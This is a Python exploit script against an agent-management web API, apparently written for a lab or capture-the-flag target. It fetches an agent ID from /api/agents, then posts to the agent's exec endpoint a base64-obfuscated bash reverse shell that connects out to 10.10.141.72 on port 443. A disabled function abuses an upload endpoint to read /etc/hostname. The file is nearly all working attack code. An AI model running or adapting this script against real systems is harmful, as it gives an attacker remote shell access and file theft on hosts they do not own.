#!/usr/env/python3

import requests
import json
import base64
import sys


def get_uid():

    url = "http://"+sys.argv[1]
    endpoint = "/api/agents"
    headers = {
	    "Content-Type" : "application/json",
         "User-Agent" : "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5"
        }
    r = requests.get(url+endpoint, headers = headers)
    json_str = json.dumps(r.text)
    return json_str[3:22]

def agent_exec(guid):
    print(guid)
    url = "http://"+sys.argv[1]
    rce_endpoint = "/api/agents/"+ guid +"/exec"
    headers = {
	    "Content-Type" : "application/json",
         "User-Agent" : "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5"
        }
    print(url+rce_endpoint)
    # fix to use sysargv . Change IP in mean times
    python_shell = "bash -i >& /dev/tcp/10.10.141.72/443 0>&1"
    b64bytes = python_shell.encode("ASCII")
    encoded = base64.b64encode(b64bytes)
    rev_shell = "exec echo " + str(encoded,'UTF-8') + " | base64 -d | bash"
    data = {"cmd" : rev_shell}
    r = requests.post(url+rce_endpoint, headers = headers, data = json.dumps(data))
    print(r.text)

def file_read(guid):
    print(guid)
    url = "http://"+sys.argv[1]
    rce_endpoint = "/api/agents/"+ guid +"/upload"
    headers = {
	    "Content-Type" : "application/json",
         "User-Agent" : "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5"
        }
    print(url+rce_endpoint)
    data = {"file" : "/etc/hostname"}
    r = requests.post(url+rce_endpoint, headers = headers, data = json.dumps(data))
    print(r.text)

   
def main():
    agent_guid = get_uid()  
    #print(agent_guid)
    #print(agent_guid)
    agent_exec(agent_guid)
   # file_read(agent_guid)
   

if __name__ == '__main__':
    main()